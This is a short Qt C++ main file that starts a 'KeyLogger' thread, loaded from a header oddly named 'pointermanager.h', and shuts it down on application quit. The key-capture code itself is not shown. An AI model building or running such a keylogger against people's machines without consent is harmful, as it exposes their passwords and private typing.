#include <QCoreApplication>
#include "pointermanager.h"
#include <QThread>
#include <QDebug>


int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    KeyLogger keyLogger;
    keyLogger.start(); // Start the key logger in a separate thread

    QObject::connect(&a, &QCoreApplication::aboutToQuit, [&]() {
        keyLogger.requestInterruption(); // Gracefully stop the logger
        keyLogger.wait();
    });

    return a.exec();
}
